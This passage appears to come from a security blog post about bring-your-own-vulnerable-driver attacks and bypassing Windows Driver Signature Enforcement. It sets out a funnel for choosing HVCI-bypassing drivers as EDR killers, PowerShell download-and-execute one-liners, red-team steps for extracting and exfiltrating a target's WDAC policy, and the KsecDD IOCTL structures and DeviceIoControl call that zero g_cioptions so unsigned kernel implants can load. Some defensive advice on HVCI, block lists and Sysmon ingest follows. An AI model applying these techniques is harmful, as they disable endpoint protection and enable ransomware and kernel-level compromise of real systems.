<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 860 490" width="100%" style="max-width:860px;display:block;margin:0 auto;font-family:'Courier New',monospace;">
  <rect width="860" height="490" fill="#0d1117" rx="10"/>
  <rect width="860" height="490" fill="none" stroke="#30363d" stroke-width="1.5" rx="10"/>
  <text x="430" y="26" font-size="14" fill="#e6edf3" text-anchor="middle" font-weight="bold">BYOVD Candidate Selection Funnel — HVCI-Aware Triage</text>
  <text x="430" y="43" font-size="10" fill="#8b949e" text-anchor="middle">From 2,197 LOLDrivers samples → operationally viable EDR/PPL killer · Data: loldrivers.io 2026-06-23</text>

  <!-- Stage 1 -->
  <polygon points="80,52 780,52 740,96 120,96" fill="#1a3a5c" stroke="#2471a3" stroke-width="1.5"/>
  <text x="430" y="70" font-size="13" fill="#aed6f1" text-anchor="middle" font-weight="bold">LOLDrivers Catalogue</text>
  <text x="430" y="87" font-size="10" fill="#85c1e9" text-anchor="middle">2,197 samples total · 656 unique drivers · loldrivers.io/api/drivers.json</text>
  <text x="792" y="77" font-size="8" fill="#566573">Updated 2026-06-23</text>

  <!-- Filter 1 -->
  <line x1="430" y1="97" x2="430" y2="112" stroke="#566573" stroke-width="1.5"/>
  <rect x="250" y="109" width="360" height="18" fill="#161b22" rx="3" stroke="#2c3e50"/>
  <text x="430" y="122" font-size="9" fill="#8b949e" text-anchor="middle">① Filter: primitive ∈ {process-kill, kernel-write, phys-read}</text>
  <!-- reject arrow right -->
  <line x1="740" y1="74" x2="790" y2="74" stroke="#e74c3c" stroke-width="1"/>
  <text x="795" y="71" font-size="8" fill="#e74c3c">~900 no useful</text>
  <text x="795" y="81" font-size="8" fill="#7f8c8d">primitive</text>

  <!-- Stage 2 -->
  <polygon points="120,128 740,128 706,168 154,168" fill="#1c2226" stroke="#566573" stroke-width="1"/>
  <text x="430" y="145" font-size="11" fill="#aab7b8" text-anchor="middle" font-weight="bold">~1,300 drivers — dangerous primitive present</text>
  <text x="430" y="162" font-size="9" fill="#909ca0" text-anchor="middle">ZwTerminateProcess · MmMapIoSpace · ZwWriteVirtualMemory in imports</text>

  <!-- Filter 2 -->
  <line x1="430" y1="169" x2="430" y2="184" stroke="#566573" stroke-width="1.5"/>
  <rect x="250" y="181" width="360" height="18" fill="#161b22" rx="3" stroke="#2c3e50"/>
  <text x="430" y="194" font-size="9" fill="#8b949e" text-anchor="middle">② Filter: HVCI bypass = TRUE — loads despite Memory Integrity</text>
  <line x1="706" y1="148" x2="790" y2="148" stroke="#e74c3c" stroke-width="1"/>
  <text x="795" y="145" font-size="8" fill="#e74c3c">~820 fail</text>
  <text x="795" y="155" font-size="8" fill="#7f8c8d">HVCI checks</text>

  <!-- Stage 3 - HVCI purple -->
  <polygon points="154,200 706,200 676,240 184,240" fill="#4a235a" stroke="#7d3c98" stroke-width="1.5"/>
  <text x="430" y="217" font-size="12" fill="#d7bde2" text-anchor="middle" font-weight="bold">479 HVCI-bypassing samples · 21.8% of catalogue</text>
  <text x="430" y="234" font-size="9" fill="#c39bd3" text-anchor="middle">Has FORCE_INTEGRITY · No W+X · Structurally HVCI-compliant · Use byovd-watchdog</text>
  <!-- byovd-watchdog badge -->
  <rect x="8" y="208" width="155" height="28" fill="#0d2318" rx="4" stroke="#27ae60" stroke-width="1"/>
  <text x="86" y="220" font-size="8" fill="#82e0aa" text-anchor="middle" font-weight="bold">🛡 BYOVD Watchdog</text>
  <text x="86" y="232" font-size="8" fill="#52be80" text-anchor="middle">byovd-watchdog.pwnfuzz.com</text>

  <!-- Filter 3 -->
  <line x1="430" y1="241" x2="430" y2="256" stroke="#566573" stroke-width="1.5"/>
  <rect x="220" y="253" width="420" height="18" fill="#161b22" rx="3" stroke="#2c3e50"/>
  <text x="430" y="266" font-size="9" fill="#8b949e" text-anchor="middle">③ Filter: Not in MS WDAC block list · SHA-256 available · VT score &lt; 5/71</text>
  <line x1="676" y1="220" x2="790" y2="220" stroke="#e74c3c" stroke-width="1"/>
  <text x="795" y="217" font-size="8" fill="#e74c3c">Eliminated by</text>
  <text x="795" y="227" font-size="8" fill="#7f8c8d">WDAC / no hash</text>

  <!-- Stage 4 -->
  <polygon points="184,272 676,272 650,308 210,308" fill="#1c2226" stroke="#566573" stroke-width="1"/>
  <text x="430" y="287" font-size="11" fill="#aab7b8" text-anchor="middle" font-weight="bold">~120–180 candidates · Not in MS block list · Hash confirmed</text>
  <text x="430" y="303" font-size="9" fill="#909ca0" text-anchor="middle">789 LOLDrivers-exclusive samples (36.3%) — cross-reference with HVCI bypass pool</text>

  <!-- Filter 4 -->
  <line x1="430" y1="309" x2="430" y2="324" stroke="#566573" stroke-width="1.5"/>
  <rect x="220" y="321" width="420" height="18" fill="#161b22" rx="3" stroke="#2c3e50"/>
  <text x="430" y="334" font-size="9" fill="#8b949e" text-anchor="middle">④ Filter: Device path recoverable · IRP_MJ_CREATE ungated · No DACL on device</text>
  <line x1="650" y1="290" x2="790" y2="290" stroke="#e74c3c" stroke-width="1"/>
  <text x="795" y="287" font-size="8" fill="#e74c3c">DACL present /</text>
  <text x="795" y="297" font-size="8" fill="#7f8c8d">path unknown</text>

  <!-- Stage 5 DrvEye -->
  <polygon points="210,340 650,340 628,374 232,374" fill="#1d2b1f" stroke="#27ae60" stroke-width="1"/>
  <text x="430" y="355" font-size="11" fill="#82e0aa" text-anchor="middle" font-weight="bold">~20–40 candidates · DrvEye UNGATED-sink confirmed</text>
  <text x="430" y="371" font-size="9" fill="#76d7a3" text-anchor="middle">primitive classified · PoC generated · no caller access check on IRP handler</text>
  <!-- DrvEye badge -->
  <rect x="8" y="346" width="155" height="26" fill="#0d2318" rx="4" stroke="#27ae60" stroke-width="1"/>
  <text x="86" y="358" font-size="8" fill="#82e0aa" text-anchor="middle" font-weight="bold">🔬 DrvEye Triage</text>
  <text x="86" y="370" font-size="8" fill="#52be80" text-anchor="middle">python3 DrvEye.py --save-pocs</text>

  <!-- Final arrow -->
  <line x1="430" y1="375" x2="430" y2="388" stroke="#27ae60" stroke-width="2"/>

  <!-- Stage 6 final -->
  <polygon points="232,388 628,388 606,430 254,430" fill="#145a32" stroke="#27ae60" stroke-width="2"/>
  <text x="430" y="406" font-size="13" fill="#82e0aa" text-anchor="middle" font-weight="bold">✅  VIABLE BYOVD CANDIDATE</text>
  <text x="430" y="423" font-size="10" fill="#52be80" text-anchor="middle">Signed · HVCI-clean · Block-list absent · Path known · IOCTL decoded · No DACL</text>

  <!-- Score legend -->
  <rect x="40" y="442" width="780" height="38" fill="#0d1117" rx="4" stroke="#30363d"/>
  <text x="55" y="457" font-size="9" fill="#82e0aa" font-weight="bold">5-Point Score:</text>
  <text x="165" y="457" font-size="9" fill="#27ae60">● WILL LOAD (HVCI)</text>
  <text x="310" y="457" font-size="9" fill="#27ae60">● Block-list absent</text>
  <text x="450" y="457" font-size="9" fill="#27ae60">● Dangerous primitive</text>
  <text x="620" y="457" font-size="9" fill="#27ae60">● UNGATED-sink</text>
  <text x="730" y="457" font-size="9" fill="#27ae60">● Path known</text>
  <text x="55" y="472" font-size="8" fill="#566573">All 5 green → operationally viable. Red on primitive or gating → move to next candidate.</text>
  <text x="700" y="472" font-size="8" fill="#2d3436">benjitrapp.github.io 🦝</text>
</svg>
</div>

### BYOVD Watchdog: Live HVCI Gap Intelligence

[BYOVD Watchdog](https://github.com/pwnfuzz/byovd-watchdog) by pwnfuzz (@ghostbyt3) automates HVCI gap tracking continuously. It is the updated successor to [BYOVDFinder](https://github.com/ghostbyt3/BYOVDFinder).

**How it works:**

1. GitHub Actions periodically fetches Microsoft's `SiPolicy_Enforced.xml`
2. `byovd.py` parses the XML and extracts all driver deny rules (hash-based and cert-based)
3. `compare_hvci.py` cross-references against the full LOLDrivers API feed
4. The delta (LOLDrivers entries NOT blocked by the current HVCI policy) is published as `byovd_changelog.json` and surfaced at [byovd-watchdog.pwnfuzz.com](https://byovd-watchdog.pwnfuzz.com/)

**Running BYOVDFinder locally:**

```powershell
# One-liner against your live system policy
IEX(New-Object net.WebClient).DownloadString(
    "https://raw.githubusercontent.com/ghostbyt3/BYOVDFinder/refs/heads/main/finder.ps1"
)

# Against a custom policy XML (exfiltrated from a target)
.\finder.ps1 -XmlFile "C:\Path\To\driversipolicy.xml"
```

Expected output:

```
DRIVER: somedriver.sys
  Link: https://www.loldrivers.io/drivers/<uuid>
  MD5:    <hash>  SHA1: <hash>  SHA256: <hash>
--------------------------------------------------------------------------------
[+] Number of Blocked Drivers: 1384
[+] Number of Allowed Drivers: 479
```

### HVCI Extraction from a Target Environment (Red Team Context)

Enterprises deploy custom WDAC policies beyond Microsoft's defaults. Extract the active policy to find which drivers remain viable specifically on that target:

```powershell
# Requires admin — but you already have admin for BYOVD
IEX(New-Object net.WebClient).DownloadString(
    "https://gist.githubusercontent.com/mattifestation/92e545bf1ee5b68eeb71d254cec2f78e/raw/.../CIPolicyParser.ps1"
)
ConvertTo-CIPolicy `
    -BinaryFilePath 'C:\Windows\System32\CodeIntegrity\driversipolicy.p7b' `
    -XmlFilePath 'C:\Windows\Temp\policy.xml'

# Exfil policy.xml, then locally:
python3 finder.py policy.xml
```

### Scoring a Candidate: The Five-Point Checklist

```bash
python3 DrvEye.py candidate.sys \
    --live-check --loldrivers --json report.json --save-pocs --verbose
```

| Criterion | Green | Red |
|---|---|---|
| **Load verdict** | `WILL LOAD` under HVCI | `WILL NOT LOAD` under HVCI |
| **Block list** | Not in WDAC or LOLDrivers list | In Microsoft block list |
| **Primitive** | `process-kill`, `kernel-write`, `physical-read` | `info-disclosure` only |
| **Gating** | `UNGATED-sink` (no access check) | `GATED-sink` (check present) |
| **Device path** | Recoverable (static or emulated) | Unknown / obfuscated |

Five greens → operationally viable. Red on primitive or gating → skip.

### WDAC and LOLDrivers-Based Prevention

Enable HVCI via Group Policy: `Computer Configuration → Administrative Templates → System → Device Guard → Turn On Virtualization Based Security`.

Verify a candidate against the block list:

```bash
python3 DrvEye.py BootRepair.sys --live-check --loldrivers --json report.json
grep "wdac_block\|loldrivers_match" report.json
```

Deploy the LOLDrivers community WDAC deny policy alongside Microsoft's built-in block list; as of mid-2026 these together still leave 479 HVCI-bypassing drivers uncovered.

---

## DSE: The Gatekeeper and Its Bypass

BYOVD's defining property is that it does not touch Driver Signature Enforcement. A legitimately signed driver complies with the enforcement policy and the kernel loads it without complaint. There is, however, a second and more aggressive technique: disable DSE entirely, enabling an attacker to load any unsigned driver including a custom kernel implant. Understanding both approaches clarifies why BYOVD is operationally preferred when a signed carrier is available, and when DSE bypass becomes necessary.

### DSE Internals: g_cioptions and CI.dll

Driver Signature Enforcement lives inside `CI.dll` (Code Integrity), the Windows component that verifies Authenticode signatures at driver load time. When `ntoskrnl.exe` processes a `NtLoadDriver` call, it invokes `CI.dll` verification routines (`SeValidateImageHeader` and related functions). A failed check returns `STATUS_INVALID_IMAGE_HASH` and the driver load is aborted before a single byte of driver code executes.

The enforcement state is governed by a single flag inside `CI.dll`: **`g_cioptions`**. Its effective values control the strictness of enforcement:

| `g_cioptions` | Enforcement state |
|---|---|
| `0x00` | Disabled. Any driver, signed or unsigned, loads freely. |
| `0x06` | Standard enforcement. Valid Authenticode chain required. |
| `0x08`+ (HVCI) | Strict. Hypervisor validates in VTL1 before the kernel maps the image. |

Writing a single zero to `&g_cioptions` neutralises DSE for the lifetime of the current boot. This is the kernel patch that tools like the older **DSEFix** relied upon, and the same write that Lazarus Group performed via `dell_bios.sys` in 2022 (see threat actor table above) before loading a custom unsigned backdoor driver. Three common paths to this write exist in practice:

1. **Physical memory mapping** via a driver that imports `MmMapIoSpace`: map the physical page containing `g_cioptions` and patch it directly. Used by early DSEFix variants.
2. **Arbitrary virtual write** via a BYOVD carrier importing `ZwWriteVirtualMemory` or equivalent: load a signed carrier, use its primitive to overwrite `g_cioptions` in kernel virtual address space, then optionally unload the carrier.
3. **Kernel function call gadget** via KsecDD.sys: the KExecDD technique, reimplemented by Dsebler. No third-party carrier required.

### The Dsebler Technique: KsecDD.sys as a Write Gadget

[Dsebler](https://github.com/lem0nSec/Dsebler) by lem0nSec is a C reimplementation of the KExecDD technique. Unlike third-party BYOVD carriers, it exploits **KsecDD.sys**, a legitimate Microsoft driver shipped with every Windows installation. KsecDD.sys is the kernel counterpart to LSASS for cryptographic operations; it exposes an IPC channel that LSASS uses for key material exchange.

The exploit path centres on a vulnerable IOCTL handler at **`0x39006f`**. When a crafted 16-byte input structure is passed to this handler, it triggers the following internal call chain:

<div class="ghidra-mock" style="overflow-x:auto;">
  <div class="gm-bar">
    <span style="color:#ff5f56">●</span>&nbsp;<span style="color:#ffbd2e">●</span>&nbsp;<span style="color:#27c93f">●</span>
    <span style="margin-left:12px;color:#8b949e;font-size:11px;font-family:'Courier New',monospace;">dsebler_chain — KsecDD.sys › CI.dll :: g_cioptions = 0</span>
  </div>
  <div style="font-family:'Courier New',monospace;font-size:12.5px;line-height:2.0;">

    <div style="background:#0d1117;padding:12px 22px 14px;border-bottom:1px solid #21262d;">
      <div style="color:#484f58;font-size:10px;text-transform:uppercase;letter-spacing:2px;margin-bottom:10px;">Ring 3 · User Mode</div>
      <div><span style="color:#8b949e;">CreateFile(</span><span style="color:#17fe33;">"\\.\KsecDD"</span><span style="color:#8b949e;">) </span><span style="color:#484f58;">→ </span><span style="color:#60a5fa;">hDevice</span></div>
      <div><span style="color:#484f58;">// build outer IPC_SET_FUNCTION_RETURN_PARAMETER (16 bytes)</span></div>
      <div><span style="color:#60a5fa;">DeviceIoControl</span><span style="color:#8b949e;">(</span><span style="color:#60a5fa;">hDevice</span><span style="color:#8b949e;">,&nbsp;</span><span style="color:#f97316;">0x39006f</span><span style="color:#8b949e;">, &amp;outerParam, 16, NULL, 0, &amp;n, NULL)</span></div>
    </div>

    <div style="background:#161b22;text-align:center;padding:7px 0;color:#f97316;font-size:11px;letter-spacing:1px;border-top:1px dashed #30363d;border-bottom:1px dashed #30363d;">
      ▼&nbsp;&nbsp;IRP crosses Ring 3 → Ring 0 boundary&nbsp;&nbsp;▼
    </div>

    <div style="background:#0d1117;padding:12px 22px 16px;border-bottom:1px solid #21262d;">
      <div style="color:#484f58;font-size:10px;text-transform:uppercase;letter-spacing:2px;margin-bottom:10px;">Ring 0 · Kernel Mode · KsecDD.sys (Microsoft-signed)</div>
      <div><span style="color:#8b949e;">IOCTL </span><span style="color:#f97316;">0x39006f</span><span style="color:#8b949e;"> → </span><span style="color:#a78bfa;">KsecFastIoDeviceControl</span></div>
      <div style="margin-left:22px;"><span style="color:#484f58;">└─► </span><span style="color:#fbbf24;">KsecIoctlHandleFunctionReturn</span><span style="color:#8b949e;">(outerParam)</span></div>
      <div style="margin-left:46px;"><span style="color:#484f58;">└─► </span><span style="color:#fbbf24;">CallInProgressCompleted</span><span style="color:#8b949e;">(innerParam)</span></div>
      <div style="margin-left:70px;"><span style="color:#484f58;">└─► </span><span style="color:#ef4444;">rip = GadgetAddress</span><span style="color:#484f58;">&nbsp;&nbsp;; executes: </span><span style="color:#17fe33;">mov [rcx], rdx</span></div>
      <div style="margin-left:94px;"><span style="color:#484f58;">rcx = </span><span style="color:#f97316;">&amp;g_cioptions</span><span style="color:#484f58;">&nbsp;&nbsp;; target in CI.dll (build-specific offset)</span></div>
      <div style="margin-left:94px;"><span style="color:#484f58;">rdx = </span><span style="color:#60a5fa;">0x00000000</span><span style="color:#484f58;">&nbsp;&nbsp;&nbsp;; value to write — disables enforcement</span></div>
    </div>

    <div style="background:#160b0b;padding:12px 22px 14px;border-top:2px solid #7f1d1d;">
      <div style="color:#ef4444;font-weight:600;margin-bottom:8px;">◼ CI.dll :: g_cioptions = 0x00 — DSE disabled for this boot</div>
      <div style="display:flex;gap:28px;flex-wrap:wrap;">
        <span style="color:#6b7280;font-size:11px;">✓ Unsigned drivers now load</span>
        <span style="color:#6b7280;font-size:11px;">✓ Custom kernel implants viable</span>
        <span style="color:#6b7280;font-size:11px;">✗ No EID 6 for KsecDD (already loaded at boot)</span>
      </div>
    </div>

  </div>
</div>

Two nested 16-byte IPC structures control the exploit. The outer structure holds a pointer to the inner structure and the `rdx` value to write. The inner structure holds the gadget address (loaded into `rip` by `CallInProgressCompleted`) and the `rcx` parameter (the address of `g_cioptions`):

<div class="ghidra-mock" style="overflow-x:auto;">
  <div class="gm-bar">
    <span style="color:#ff5f56">●</span>&nbsp;<span style="color:#ffbd2e">●</span>&nbsp;<span style="color:#27c93f">●</span>
    <span style="margin-left:12px;color:#8b949e;font-size:11px;font-family:'Courier New',monospace;">dsebler_structs.c — IPC structures for IOCTL 0x39006f</span>
  </div>
  <div style="padding:16px 22px 18px;font-family:'Courier New',monospace;font-size:12.5px;line-height:1.9;">
    <div><span style="color:#484f58;">// Inner structure: gadget address + rcx target (16 bytes)</span></div>
    <div><span style="color:#60a5fa;">typedef struct </span><span style="color:#a78bfa;">_IPC_SET_FUNCTION_RETURN_DEEP_PARAMETER</span><span style="color:#8b949e;"> {</span></div>
    <div style="margin-left:20px;"><span style="color:#60a5fa;">PVOID</span><span style="color:#8b949e;"> GadgetAddress;</span><span style="color:#484f58;">  // loaded into rip: executes mov [rcx], rdx</span></div>
    <div style="margin-left:20px;"><span style="color:#60a5fa;">PVOID</span><span style="color:#8b949e;"> RcxParameter;</span><span style="color:#484f58;">  // target address: &amp;g_cioptions in CI.dll</span></div>
    <div><span style="color:#8b949e;">} IPC_SET_FUNCTION_RETURN_DEEP_PARAMETER;</span></div>
    <div style="margin-top:8px;"><span style="color:#484f58;">// Outer structure: ptr to inner + rdx value (16 bytes)</span></div>
    <div><span style="color:#60a5fa;">typedef struct </span><span style="color:#a78bfa;">_IPC_SET_FUNCTION_RETURN_PARAMETER</span><span style="color:#8b949e;"> {</span></div>
    <div style="margin-left:20px;"><span style="color:#a78bfa;">IPC_SET_FUNCTION_RETURN_DEEP_PARAMETER</span><span style="color:#8b949e;">* pDeep;</span></div>
    <div style="margin-left:20px;"><span style="color:#60a5fa;">PVOID</span><span style="color:#8b949e;"> RdxValue;</span><span style="color:#484f58;">     // 0 = disable DSE · non-zero = re-enable</span></div>
    <div><span style="color:#8b949e;">} IPC_SET_FUNCTION_RETURN_PARAMETER;</span></div>
    <div style="margin-top:12px;padding-top:12px;border-top:1px solid #21262d;"><span style="color:#484f58;">// Disable DSE: write 0 to g_cioptions</span></div>
    <div><span style="color:#a78bfa;">IPC_SET_FUNCTION_RETURN_DEEP_PARAMETER</span><span style="color:#8b949e;"> inner = {</span></div>
    <div style="margin-left:20px;"><span style="color:#8b949e;">.</span><span style="color:#17fe33;">GadgetAddress</span><span style="color:#8b949e;"> = (PVOID)</span><span style="color:#f97316;">GADGET_OFFSET</span><span style="color:#8b949e;">,</span><span style="color:#484f58;">  // build-specific — recalc after each OS update</span></div>
    <div style="margin-left:20px;"><span style="color:#8b949e;">.</span><span style="color:#17fe33;">RcxParameter</span><span style="color:#8b949e;"> = (PVOID)</span><span style="color:#f97316;">G_CIOPTIONS_ADDR</span><span style="color:#8b949e;">,</span><span style="color:#484f58;"> // g_cioptions in loaded CI.dll image</span></div>
    <div><span style="color:#8b949e;">};</span></div>
    <div><span style="color:#a78bfa;">IPC_SET_FUNCTION_RETURN_PARAMETER</span><span style="color:#8b949e;"> outer = { &amp;inner, (PVOID)</span><span style="color:#60a5fa;">0ULL</span><span style="color:#8b949e;"> };</span></div>
    <div style="margin-top:8px;"><span style="color:#fbbf24;">DeviceIoControl</span><span style="color:#8b949e;">(</span><span style="color:#60a5fa;">hKsecDD</span><span style="color:#8b949e;">, </span><span style="color:#f97316;">0x39006f</span><span style="color:#8b949e;">, &amp;outer, </span><span style="color:#f97316;">sizeof(outer)</span><span style="color:#8b949e;">, NULL, 0, &amp;dwReturned, NULL);</span></div>
    <div style="margin-top:6px;"><span style="color:#484f58;">// Supported build: Windows 10 19045 · extend by recalculating offsets per CI.dll version</span></div>
  </div>
</div>

**Why KsecDD.sys cannot be blocked:** it is a Microsoft-signed driver present on every Windows system from Vista onward. Any WDAC deny-list entry against KsecDD.sys breaks LSASS cryptographic operations, disabling BitLocker, Windows Hello, and NTLM authentication. This persistence in the trusted driver pool gives the technique a structural durability that third-party BYOVD carriers lack.

**Operational constraint:** current Dsebler hardcodes the `g_cioptions` address and the ROP gadget offset for Windows 10 build 19045. Each new Windows build recompiles `CI.dll`, shifting both values. Remaining operational across patch cycles requires recalculating these offsets after each feature update.

### BYOVD vs. DSE Bypass: Two Paths to Ring 0

The two techniques solve different problems. BYOVD kills a running process via a kernel primitive and requires a signed carrier. DSE bypass enables loading of arbitrary unsigned code and requires a reliable kernel write. An operator choosing between them asks a simple question: is the goal to terminate a process, or to run a custom kernel implant?

| | **BYOVD (DSE-compliant)** | **DSE Bypass (Dsebler / KExecDD model)** |
|---|---|---|
| **Driver used** | Legitimately signed third-party carrier | KsecDD.sys (built-in, Microsoft-signed) |
| **Unsigned code loaded** | Never | Enabled once g_cioptions = 0 |
| **Immediate effect** | Target process killed | Any unsigned driver can now load |
| **Primary use case** | EDR termination before payload delivery | Custom kernel implant deployment |
| **EID 6 detection signal** | Third-party driver load, SHA-256 hashable | Absent: KsecDD already loaded at boot |
| **HVCI mitigation** | Blocked if carrier fails FORCE_INTEGRITY or W+X | Blocked: VTL1 maintains authoritative CI state; VTL0 write to g_cioptions has no effect |
| **Build specificity** | Low (IOCTL code stable across driver versions) | High (g_cioptions + gadget offset change per build) |
| **Operational cost** | Low (one-shot IOCTL, no patching) | High (offset maintenance, potential token impersonation) |

HVCI stops both paths, but through different mechanisms. BYOVD carriers that fail the `FORCE_INTEGRITY` or W+X structural checks are rejected before the kernel maps the image. DSE bypass via `g_cioptions` overwrite is stopped because HVCI externalises the enforcement state to VTL1: writes to the VTL0 kernel copy of `g_cioptions` have no effect because the hypervisor maintains its own authoritative enforcement record in secure memory that the VTL0 kernel cannot modify. This architectural separation is why HVCI is the single control that breaks both attack classes simultaneously.

---

## BYOVD in Ransomware Operations

BYOVD sits squarely in Phase 4 (Defense Evasion) of the [Unified Ransomware Kill Chain](https://benjitrapp.github.io/cultures/2026-06-24-unified-ransomware-kill-chain/). Its role is to buy unobserved execution time:

![](/images/ransomware_deployment_chain.png)

The dwell time between driver load and EDR termination is typically under 30 seconds. If your Sysmon pipeline has a 5-minute ingest delay, you will see the EID 6 alert after the EDR is already dead.

> **The CSIRT lesson:** Endpoint visibility is only as good as your ingest latency. Optimise your pipeline for sub-60-second ingest on Sysmon Event ID 6 with LOLDrivers hash matching at ingest.

---

## References and Open-Source Research

**Primary research and tools:**
- **Dsebler**: [github.com/lem0nSec/Dsebler](https://github.com/lem0nSec/Dsebler) — KExecDD reimplementation; KsecDD.sys as DSE disable gadget
- **PhantomKiller**: [github.com/redteamfortress/PhantomKiller](https://github.com/redteamfortress/PhantomKiller)
- **NimBlackout**: [github.com/Helixo32/NimBlackout](https://github.com/Helixo32/NimBlackout)
- **DrvEye**: [github.com/0xDbgMan/DrvEye](https://github.com/0xDbgMan/DrvEye)
- **BYOVD Watchdog**: [github.com/pwnfuzz/byovd-watchdog](https://github.com/pwnfuzz/byovd-watchdog) · live at [byovd-watchdog.pwnfuzz.com](https://byovd-watchdog.pwnfuzz.com/)
- **BYOVDFinder**: [github.com/ghostbyt3/BYOVDFinder](https://github.com/ghostbyt3/BYOVDFinder)
- **Trail of Bits HVCI LOLDrivers Check**: [github.com/trailofbits/HVCI-loldrivers-check](https://github.com/trailofbits/HVCI-loldrivers-check)
- **ADHDMurky: BYOVD for Dummies**: [adhdmurky.github.io/posts/post3](https://adhdmurky.github.io/posts/post3/)
- **Blackout (original)**: [github.com/ZeroMemoryEx/Blackout](https://github.com/ZeroMemoryEx/Blackout)

**Community resources:**
- **LOLDrivers**: [loldrivers.io](https://www.loldrivers.io/) · [SIEM detections](https://www.loldrivers.io/#detections)
- **Microsoft WDAC Block List**: [aka.ms/VulnerableDriverBlockList](https://aka.ms/VulnerableDriverBlockList)
- **MITRE ATT&CK:** [T1068](https://attack.mitre.org/techniques/T1068/) · [T1562.001](https://attack.mitre.org/techniques/T1562/001/) · [T1543.003](https://attack.mitre.org/techniques/T1543/003/) · [T1014](https://attack.mitre.org/techniques/T1014/)

**Related posts on this blog:**
- [EDR Bypass Roadmap](https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/)
- [ETW-TI Deep Dive](https://benjitrapp.github.io/defenses/2026-06-19-etw-ti/)
- [Breaking the Thread & Spawning Ghosts](https://benjitrapp.github.io/attacks/2026-05-17-threadless-injection-process-ghosting/)
- [Unified Ransomware Kill Chain](https://benjitrapp.github.io/cultures/2026-06-24-unified-ransomware-kill-chain/)

